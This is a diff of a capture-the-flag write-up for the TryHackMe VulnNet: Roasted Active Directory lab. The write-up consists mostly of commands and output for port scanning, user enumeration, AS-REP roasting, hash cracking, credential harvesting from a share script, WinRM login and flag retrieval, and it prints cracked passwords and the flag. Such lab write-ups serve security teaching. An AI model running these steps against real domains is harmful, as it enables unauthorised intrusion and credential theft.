@@ -1,7 +1,6 @@
 ```Bash
 nmap -p- -Pn $target -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -A
 ```
-
 ```Bash
 Discovered open port 135/tcp on 10.201.127.94
 Discovered open port 139/tcp on 10.201.127.94
@@ -70,7 +69,6 @@ PORT      STATE SERVICE       VERSION
 49677/tcp open  msrpc         Microsoft Windows RPC
 49703/tcp open  msrpc         Microsoft Windows RPC
 ```
-
 ```Bash
  =================================( Share Enumeration on 10.201.127.94 )=================================
                                                                                                                                                                                                                                             
@@ -104,11 +102,8 @@ NT_STATUS_NO_SUCH_FILE listing \*
 
  ===========================( Password Policy Information for 10.201.127.94 )===========================
 ```
-
 We didn’t find anything on shares
-
 But, we can see SID from enum4linux
-
 ```Bash
 [I] Found new SID:                                                                                                                                                                                                                          
 S-1-5-21-1589833671-435344116-4136949213                                                                                                                                                                                                    
@@ -140,13 +135,10 @@ S-1-5-32
 [I] Found new SID:                                                                                                                                                                                                                          
 S-1-5-21-1589833671-435344116-4136949213
 ```
-
 Ok. Use this one:
-
 ```Bash
 impacket-lookupsid vulnnet-rst.local/guest@$target | grep "SidTypeUser"
 ```
-
 ```Bash
 500: VULNNET-RST\Administrator (SidTypeUser)
 501: VULNNET-RST\Guest (SidTypeUser)
@@ -158,27 +150,21 @@ impacket-lookupsid vulnnet-rst.local/guest@$target | grep "SidTypeUser"
 1110: VULNNET-RST\j-goldenhand (SidTypeUser)
 1111: VULNNET-RST\j-leet (SidTypeUser)
 ```
-
 ```Bash
 impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile user.txt -format hashcat -outputfile hashes.txt
 ```
-
 ```Bash
 $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:f9703671c26dd287e604223e88c2b8b9$f35bc579c885b2098165f9397e0128ec7baa9b41e4ceb5fe120cbbe16c5c40ebfc1e1f9950a61e629a48f61c8e236dff705e78157db4e54cce27b3622d5deb1303f4042b94fa393ea7b0d64b178fdfdc8f9e3e3fa0a48262d22b2c85140a94f13f61d721b1a8a9b59e0f304dbb72c83b8e8a5a547a6827a3d12e71a5ec76ed5b714cae8cb9b6493d8f36f03da3c4621537e0bc5bf411792de3b6fc18ba988e9cf24534229ec8b9c195abe6d146b7f55cf9c8576c298ed2de91b5b3b05710ab3aec68fc3191c0f741be3dd64fb2d757f8ef68cd911b5d921247d340ad39c75efc518cbe9eb2c1c863f277298e1d1b2d9b7ef6de379a25
 ```
-
 ```Bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=krb5asrep
 ```
-
 ```Bash
 t-skid:tj072889*
 ```
-
 ```Bash
 smbclient \\\\$target\\NETLOGON -U vulnnet-rst.local\\t-skid
 ```
-
 ```Bash
 smb: \> dir
   .                                   D        0  Tue Mar 16 19:15:49 2021
@@ -189,14 +175,11 @@ smb: \> dir
 smb: \> mget ResetPassword.vbs
 Get file ResetPassword.vbs? y
 ```
-
 ```Bash
 strUserNTName = "a-whitehat"
 strPassword = "bNdKVkjv3RR9ht"
 ```
-
-Boom
-
+Boom:
 ```Bash
 ┌──(kali㉿kali)-[~/Desktop/vulnet_roasted-thm]
 └─$ crackmapexec winrm $target -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
@@ -206,7 +189,6 @@ HTTP        10.201.27.231   5985   WIN-2BO8M1OE1M1  [*] http://10.201.27.231:598
   arc4 = algorithms.ARC4(self._key)
 WINRM       10.201.27.231   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
 ```
-
 ```Bash
 *Evil-WinRM* PS C:\Users\a-whitehat\Desktop> Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
 THM{726b7c0baaac1455d05c827b5561f4ed}
